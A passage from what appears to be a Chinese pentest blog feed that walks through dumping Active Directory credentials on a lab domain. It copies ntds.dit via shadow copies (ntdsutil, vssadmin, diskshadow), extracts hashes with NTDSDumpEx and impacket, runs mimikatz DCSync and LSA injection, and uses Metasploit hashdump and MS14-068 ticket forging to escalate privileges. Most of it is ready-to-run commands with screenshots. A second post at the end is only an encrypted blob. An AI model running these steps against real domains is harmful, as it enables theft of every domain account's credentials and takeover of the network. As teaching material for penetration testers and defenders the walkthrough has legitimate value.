src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171654449.png" alt="image-20240107171654449">输入如下命令将之前加载的快照卸载并删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;unmount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171703160.png" alt="image-20240107171703160"></p><p>查看当前系统中的所有快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;List All&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171710594.png" alt="image-20240107171710594"><br>之前创的没有删除所以有这么多</p><ul><li><strong>利用vssadmin提取ntds,dit</strong><br>vssadmin是windows server 2008 及windows 7提供的vss管理工具，可用于创建和删除卷影拷贝，列出卷影拷贝的信息（只能管理系统provider创建的卷影拷贝),显示已安装的所有卷影拷贝写入程序(writers)和提供程序(providers)，以及改变卷影拷贝的储存空间。</li></ul><p>创建一个c盘卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin create shadow /for=c:<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171950663.png" alt="image-20240107171950663"></p><p>在创建的卷影拷贝中将ntds.dit复制出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit  c:\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171957880.png" alt="image-20240107171957880">删除卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin delete shadows /for=c: /quiet<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172032840.png" alt="image-20240107172032840"></p><ul><li><strong>利用vssown.vbs脚本提取ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动卷影拷贝服务</span><br>cscript vssown.vbs /start<br><span class="hljs-comment">#创建一个c盘的卷影拷贝</span><br>cscript vssown.vbs /create c<br><span class="hljs-comment">#列出当前卷影拷贝</span><br>cscript vssown.vbs /list<br><span class="hljs-comment">#删除卷影拷贝</span><br>cscript vssown.vbs /delete &#123;GUID&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172041493.png" alt="image-20240107172041493"><br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172108749.png" alt="image-20240107172108749"><br>然后可以通过copy命令将其复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>使用ntdsutil的IFM创建卷影拷贝</strong><br>在域控制器中以管理员模式打开命令行环境，输入如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172139085.png" alt="image-20240107172139085"><br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172146934.png" alt="image-20240107172146934">将其拖到本地后删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> /s/q <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172223341.png" alt="image-20240107172223341"></p><ul><li><strong>使用diskshadow导出ntds.dit</strong><br>在渗透测试中可以使用diskshadow.exe来执行命令。例如将需要执行的命令”exec c:\windows\system32\calc.exe”<br>写入C盘目录下的command.txt文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s c:\command.txt<br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172232775.png" alt="image-20240107172232775"></li></ul><p>使用diskshadow.exe也可以用来导出ntds.dit。将如下命令写入一个文本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> someAlias<br>create<br>expose %someAlias% k:<br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit<br>delete shadows all<br>list shadows all<br>reset<br><span class="hljs-built_in">exit</span><br><br><br>diskshadow /s c:\Users\de1ay\Desktop\command.txt<br><br>reg save hklm\system c:\system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172240939.png" alt="image-20240107172240939"><br>成功导出</p><h2 id="导出ntds-dit中散列值"><a href="#导出ntds-dit中散列值" class="headerlink" title="导出ntds.dit中散列值"></a>导出ntds.dit中散列值</h2><ul><li><strong>使用esedbexport恢复ntds.dit</strong><br>1.导出ntds.dit<br>安装好该软件<br><a href="https://github.com/libyal/libesedb/releases/tag/20210424">https://github.com/libyal/libesedb/releases/tag/20210424</a><br>将文件拖入kali中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">esedbexport -m tables ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172252334.png" alt="image-20240107172252334"></p><p>2.导出散列值</p><p>ntdsxtract</p><ul><li><strong>使用impacket工具包导出散列值</strong></li></ul><p>impacket-secretsdump</p><ul><li><strong>在windows在解析ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\NTDSDumpEx.exe -d ntds.dit -s .\system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172307879.png" alt="image-20240107172307879"></p><h2 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h2><ul><li><strong>使用mimikatz转储域散列值</strong><br>以域管理员权限打开命令行环境，运行mimikatz。输入如下命令，使用mimikatz导出域内的所有用户及散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172430351.png" alt="image-20240107172430351"></p><p>使用mimikatz的dcsync功能也可以导出指定用户的散列值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /user:de1ay<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172442051.png" alt="image-20240107172442051"><br>也可以直接在域控制器中运行Mimikatz，通过转储lsass.exe进程对散列值进行Dump操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>lsadump::lsa /inject<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172451207.png" alt="image-20240107172451207"></p><ul><li><strong>使用dcsync获取账号和域散列值</strong><br>Invoke-DCSync.ps1可以利用dcsync直接读取ntds.dit，以获取域账号和域散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-DCSync -PWDumpFormat<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172507284.png" alt="image-20240107172507284"></p><p>项目地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><h2 id="使用msf获取域散列值"><a href="#使用msf获取域散列值" class="headerlink" title="使用msf获取域散列值"></a>使用msf获取域散列值</h2><ul><li><p><strong>psexec_ntdsgrad</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/psexec_ntdsgrad<br></code></pre></td></tr></table></figure><p>设置好参数后运行即可，会将ntds.dit和SYSTEM项复制并传送到&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;文件夹下<br>拿到两个文件后就可以用工具进行解密了</p></li><li><p><strong>基于msf会话获取域账号和散列值</strong><br>比如已经获取到一个会话了<br>然后使用</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/gather/credentials/domain_hashdump<br></code></pre></td></tr></table></figure><p>就会导出域中的全部hash值</p><ul><li><strong>ms14-068漏洞</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172516032.png" alt="image-20240107172516032"></p><p>接下来进行格式转换,msf不支持bin文件导出，所以要用mimikatz文件进行格式转换.在mimikatz输入命令,导出kirbi格式文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::clist <span class="hljs-string">&quot;20210609221820_default_192.168.43.16_windows.kerberos_125881.bin&quot;</span> /export<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172524015.png" alt="image-20240107172524015"><br>比如现在有一个低权限shell<br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172531778.png" alt="image-20240107172531778"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#x30;&#x2d;&#x30;&#x30;&#48;&#48;&#48;&#x30;&#x30;&#x30;&#x2d;&#x64;&#x65;&#49;&#x61;&#121;&#64;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;&#45;&#x44;&#69;&#49;&#65;&#x59;&#46;&#67;&#x4f;&#77;&#46;&#x6b;&#x69;&#x72;&#x62;&#105;">&#x30;&#x2d;&#x30;&#x30;&#48;&#48;&#48;&#x30;&#x30;&#x30;&#x2d;&#x64;&#x65;&#49;&#x61;&#121;&#64;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;&#45;&#x44;&#69;&#49;&#65;&#x59;&#46;&#67;&#x4f;&#77;&#46;&#x6b;&#x69;&#x72;&#x62;&#105;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/current_user_psexec<br><span class="hljs-built_in">set</span> technique psh<br><span class="hljs-built_in">set</span> rhosts DC.de1ay.com<br><span class="hljs-built_in">set</span> session 1<br></code></pre></td></tr></table></figure><p>就会得到高权限</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域控制器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl流量加密</title>
    <link href="/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
    <url>/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e9daa28b3613553dabec42e234489f3133817b39e2471428bb99f2120e6f7feb">098d9f64412ee3ba7b7422d539a1fc8767e556316e8b00c00eb0aebe12e62b1a93fe768c8b0459b9fcf6d20c12a6dd46f070f2b9b3fee4ab0e7802990adcaebf3cf9761e4ff183da14b81879749a26514d28b22c17e722a7357d3a2733154c3ad8bca588015c9d3318c02c35d26dd87dbb1dd76f50e483224f16fe2f38cddf86618221772e5e9f926fe5fae22f85a425de6fcf2f71bfbc2ea4300b93963f5564f3697452fe42a38372b7ef078f0d5b512147bf00ad594266425fe9960b1af49c7b7d036b549386658bbaff2003c23ec60845e8a2ecb25dcbe8cfb3ce13a1a44de5c2dcd7d72c8a15d052923b58610c1b46e4b7f63485edaed212b7047fdf53b5c9e3fd9916b4c330fd55d96357486ec5b74014a8bc71e5db2d304914c2f77c08e0c8369b85dfa4cdb70f9c11f4ffe194d2e49fe63c396d01cb0eb1f5c6419e40fb85d596636272312279b4552e8710bdc1c65d3eda46baa53bb51484fe93b84566238cded2c8be11f4869b5f9d035c28954634ad8b3c467096d5a13380c3ecfcd21363715a7819acd050f5a59b2a10ebaa638f73b2e8c5f8cd4fd8bb102ef2bfdff3690d977267920618023b8b4eae375b56f04efdf77cfcb5452c9995e62cc8b0ebbe66313605a3de1c8d6ef0031869edf830120a196329be3c693b3ef635358423f601d412dd862363b2d1eb6e2f935f215bb4da7fdea9eb5c692512e8a67166bbb90c58702e39a9f0cde9357cdcb2becaee414f5aa661e6f90f3309392b785861686b0fa4f4c0a7e64bdab3dc4dd9c7d2d35aae1dbef8097bf7d11e40b73074f1582ca066caa5acc5a304ff4ae01463913f6ee475c8d6708f9bf7980ba3a38c00026a0d44ff2f1ea435e38578a1424ee2db8ba49b6c7194b93797c9863aa90d462aee84e08c1162df989c7b142d4fee560632ca6e81b7f5a08fe422e28432e144b24df02b97e78da3fd111375c73641f3eea1553951aa1383e06cb026e142779fbfb5f3a29445eadeaa907ebd9cba93d669a0446ad3fd270dea9673a4615f7e513496c831145b59f267f709e47137fcc4e6e21af95d02ecd629c815326f9c61979ae3fecf936814a6964c241289e3edfe8cf32455bc960cd6746f660ebb87a690456d3ec1a00f80a6ff54e28695e2ce9bd1ce30f287d766bfe218390b75e6ea757447951892eb3fb24cf4f42d809770a5c051cdcd7479ed79cfd02ac76eb9a62b734c4da9da573fa441f3ef0476c4f93049a996e5e773f815849174fcee8a5c62ac48fffc2f16d96ff5f1d1c508c1dc13a051fdaf0c2631e74014b587d808291b682d616a6ee1c4ec6c67998b125ae8d66fbc5c5a5767e7de6e4cf3a8f5340c086ad633597985500a721f52b3b8b26d1dd6a8c48ca4aab8ddc9810ef71cdbde817a6e8b9e292f9d473537bba719716d834102544e5f0d42ae07fb550f00591fccb919c3b7dbe4d270ae307d63c2c06f035582a4b398da6b0927cc79b1a8013ef409eb51bbdc5566471c9f135e36744ea058947ff90bc9d61c3864dcf07278c1549f53f54e2cf5af2e65687e3677b25e56463755a3fd8b14fd8b427a5a9726afb44f94290dab6af65d5ad1942e40075f3cdd25a6a8edb79062e9da71df6713e11ab0754575e7c5a9f6f2261158e8d01f8309aa8810d30fec8cfaecc6921b326ad4a776d28336ade2f2d147fb6dd63353b0b75a246c2d4f6d93b6b0dbfe0954b670feaec566c2e186e81408ca0b7d6900758466bf410a3d03691a86ab7b5571c0a7baaab35d4e6ef865ea20d5b7838d3d05fbbba6679eddee6329de1801e97615c545e3ecafa4a7357f9c1f2c30d5ef1aa3b022a8e406715cc57ef204e85861f35e57c48e3304804ab8740501dbac63f0f3509bba8fba73af3e24d976437834c2a09963429c9550f7812970ab29efb98a3a875a3817c67629b874bd7983b6ba5422a532228336a11be67c9490ccc33b5c6a27e6724cd411c78bd5f3dc796412383418e1eed852a2e80c09c202b80cd992257b00a89c54ca0ba438933975b197459cea0e57a267d8758b28db5dd00e17ea015af28c99eca2c91dd300c34f263b97f0280dac940bdb99694becb1a81412dd262b917762f3a2b725b01aca92da37233f6d5b0a57785d6dc78aaa920a309f6a4150a433bea6bcfe19b78ff22d0e977039c3b2cd193fc98f7a72d76d393c1aabf3aedffcf821359adc4cde0c11699ef7928509110f90dcb35ff5e0631e82f0044ae2ed97e3eaee4a9562cf1ffdf3a3095da603594f4ea385e10da43ff6dc8e52b896667c91d8770619fce6ceb9202fda90080331cbf1016fcd08baf7b75dfd30df4fb2ad230b17df5c41ea26f92059ef146eafe48b2a6fa0d22399c0e8a2d9f5e68d711fdf1cbd94a50551ac56063cd5450603e7a5004ff1cda0a8700bbfb342d3d740f3a51c86eb81a98d4ee241f98c70da77f0edb783acc83e46a0c74eb064b3b9088c237761b56a9ff861ee60aca5b277e8357011dc81ab3a84fb469a582610eb4b92f8c8cb197be1d1bd943a3c18fab88dd1153801f33e7039641601c5216229cf661731d087fe53989a062c5ae1c4bf0641e40d322f3bcad2831f356a5deabe302b35906289267974868054aef1d216ca2e3e73b05c97fd1570cda0d6c6374f971412e14d934dc378a7c3b8d1d557b08cfb7b62e79d5490164d06f7febac5315e2a60679922df9106fd3ea79af2af4a889baa6f34f3989ac5f0f4d4377f287779cd3ca471c4a5dbb87c6077bd3da123cf08fa6a05819c8dca7db2b6e20891cf40893de1b31b6b59bdfcf260ba0b18af5053729a61ce30f9906b6f537f21c4c2bbec9803f8ecaf3c5d858447cfd00faa7aab08b8d4b106e6a7c5eaea11ce3ddf4cd0399172049d55af7512d4e061b68477b5c25375b2b743a13c0bf070f5b357025d7af0a36db82d43c9f1a10a78a8535f42e077503814c73f270c9d492c786b9278ed51d18aad8c8efaa2d33fd6f21176e8a7176927537c7a9b4b79c067ec15dd523de76deb2849545c64a72ccb0b4a5197c70cfcdde84bb12c86176af6df0614d5da113715447187a9876b9b745c7d63daf82895d452e87f0baf803ed1bc99d7d4f340dd33aebf8b6ca0b68dae2edd607b85c45acfaddb41b243cffe558cf020962d5038b730ad75eee7a40ee8dd97df83d83b77b4696e712af5308e154ec0cd57b7496aa5674a10e7edeffede4ac008e9d3e2bb55cccd4e87a797e30946b67cdfb399db4697294c0666f0da5c5e8f8585c054301d1165116933c220be54eab0b13974878a0d426682a7e4bab3e1db510c139b9af4f4f11b4ec29c9f9a33c3b3570596b47dc5c2564ffb260e9755ef9ba9771612c6c03b7cb1854d53a0b6b40989084f92b80306e53618683589a820d90af2f1fc373d15403a9022a699e21da103f7c49f0bf132afeb01de0ab40130ea9a38a545fc069e10951f28fd3cac2e2cf09c6cb37d43da794e563640605d1d5031376f03d9d2975d0f9cf71f4d730b7cb3ec834da94ff6397c78998399499e24a018ac03b93f28634c34ee6981539323f5184b0ff0230965cc29bc51588e70bd8fb5e618c65b0856d14740a2745ff4be8f81160f3f67dda23ea52f6d598b5d91d6fa1c518335cd45b6a966010bd87689737ac83e94aae64a3cb52b2a3da3dbe5e63920b0d1d650d6e2cdfb6ac4654b7a069e7ecae0d8d275b0b822e366258294ec5da973b0ea0456af2aa201e611e59b800169e64a175661e9e54e973600b05e6ab8d05d4f2c0caeae70dc3c2172bbafa356bdd0d520cb6e16092cae1dbc8a12c4b249a98cc1453479d3cc226c7b16792892d04c71406986bd26805adf030fa4fabcdb038d00ccdf07d334ebbead5180f9529a3530ddb8099588e3a51a75779b74ad1d6ffef3b772a8ad48c8de98214bca791cd71feefa9f7ff52a960a4e4d1e7ba52e843eef9fae584f46381f2ba45650e0111789c30627b57212264c9425400c9c28204b4803dd8c0c293ae24073575c836da7ee4cd95f0d604ce91458bb8d7510c545b1396768f04ad98224bd384fea3c57a4beac2755695622b9bb11b17aaef85b282f3461fe024ac792241f92a9c8971b42fc7dbac69d23c0d3b3ace6ab473201f341e8fb78b159c0f53880bffe8c047433cb477ec47d270a3100400e2075eecc570cca9e393c9a6ae4b656d5e397982d9f27c860a88fb57d921ddefd9231a79cc601cb4d193389ceb06fe3a888ae3154efccb99534bd0adc034b848759e54681595eb2ec911eb2aa15ced88f0efa0eb5bdcf776790a92a3638ac867b9760ff8084d437bf18fb725ba59bfb0ea1f97be466913724a260456f886073612874f6902be269d18c620db3a8a8acbe1f715b52a8c95c6c43df71d649f66ddb51242390e1058d55937013fc9048e30fe183005afb769a465b6da71d50570b1408abb425d7fdf3c28395740129aafd587e078713dc3f9e448bd10968f86783f6691a9d2b66e798aa7c47359c5d768174a5463d041d194897465365f4fcb7ed372d9118e5a8570f4ff95db5b01599fb5433a4b4f611375ce362c3b1a6402aaa90acccd175226df2bc0b02cbeed9ff66463cf06f6c4e7631cb7988512343960d8a73a58dcc7709c1a9d7b0afc9993b4d1239637568a6fefc5ced09b19eb120d717fa59014dbd803466beecbfde9ccadb5f5a2a659f3e64dc7a3c9349bb221866b14f57d72d4fef84a832cc757dd42bd4deff6df52a7e80ed09ffa80b1a99a6729c67dbb5961162e8a603782ac3114855d9acbadbff920dc83114535c654ba7ff74a8a855fa4f40e8305778ceabced5ae020faf4b5145801b3d0ac788b59ee8733e991b02f8d79343657d05b50728f8960f4fb3ef695436c57cf69983265c7fb3c714a8fb8203f0aacd4da8a93a8cb21c0d97a2c7a11f796bf420b22dce36663e295528be81a9bc2e6e146007b34614dc64512a264629005bad56937a517e85080ac587b3476d6b73fecda40906e96ff9d56db916b948184f70ef569b53a4913ba2760e60d08f5915c78d32bc2020b5238a4051ceae701b0dba86f522c41774e74ad6e5872798cb9ede724fc413f2ae1e88db5f50cbeca9b45a1a96fd8d418c92d7e4b13519f969bbfcc10f73c45219883658665e05fa953db1adc53bee1cfbe065883e4b8fa081870d2701351f36a33a05f6e4c443a1e0f0c3b65e37ae32e182276129d0ddbdad6c4b8b720009081cb6d203d729529754dcf8800a103a0827a387432bc1c92f43f5700e3c6ce0e52754b94184543f525d9f95dda8fe34e559a819a8f275ab1434a8c11d87d15e620c7ca3ac3adcdcef05c61381466e4633b862889ef7f8357c0d5e7be930b2913ff79ba086d2e28c3160b23d4bc938047d7425fe2563c96a6b172c0be17762a0e7d0486f8ef857f29f85a224990da80a1b8d87d19a87ea9c537c7d0b6dacee0fd2061e075fe8dc6bbeea985dde5a76c9869a3ae1ea9e1f4b2e8b55e324dbbc4c11d61521fc460571c826f2f96a663d6a8a2d9f3f12fd689fe688a045bb3120d89e35e2c4e10b8f272a1ee47fe90857e238210af7a22282be38b13c7001a336f479b6ae0e5bd3f320f09a90ffe46757e51fb6c713156c78a4812c0554472cb34703da6b7994b7743dd2ad7b679bdfd787c5579a67c6c410df423c143ec08aceefe91698920754ca7e7edce98bf9aeb4833919793cb3ee140cadc6f336ea60efd99af2c35a3f3d9500d3004b9c937380455407fcfa276d236de1d92883d9a3670875474ef55ce16af00f9d38924427fa30323f497a7a52c9a5860d3c6272648af9ce44d1babb32e51c5b8ab058de6aec5f312a4d9ab0a9076e078a42dc6e8c7d03813794235ee8d037e0e140776c982ec4af9882c49e2e125417569333183ef1bcb06dda3d9791956885e4b4b10c6fa9065a706939d9f21bc856d83182930f38026906bad93deddc6ce8e710a5aa1c2c3c0f352a5d02ac1ea720fc299b88225d0203d8c65caa9b967e253ef7b4a214f9f16d560a992781c011b59a8cd75efafdc0174d16365161d29e48fb360ab28ef38c019e3b81b500ab4c51e8dfd04c62f8408ce8b731b26859b3e4670775e4caba381f009d33752c345f8469b3053b4692e3542873cbabaf32d6ae2b85762dee00a442f698d76bde458197c76edb367a55c3698b1dc8511b2a2289b8bb32078721d19b5ddc4ebc824578d2367ed06c3b7038211039b98d193eb06496f5ff28f43d77983972aeca93e2784da5a32cf1d353afb9d008b97972c2151e3df26dccb4938bbf8fa1076b6bc539604ccb36f816f7b7a0a2fd21fff543e56b49724b92d23ea3642148ed50b7a00447bfbbc5cbedfd758d9a4a44a1cb5990810de60ff7e60ca062bb7ba7d832926a22100d1e3d86c5d02e6a7b519872ab0336880204ff17da47a9c96502845e20890e7db2ba09bf0a9ffe1ecd7bde92c458871ca74278dc68f14673a57f3a445c3ab4d70ae235c178510bb3963b3877820cc0c75466105a7e81d273da9b304b888ff55c4a4e32a8ccbad45cda1dc6b38e82c231e2df7472ff5eb9df5450931b8c3a6fde87cb58336d961ffb36a6ae10e5e322e33edd21a790d9570cc944f54d9d263a303577ade10661343c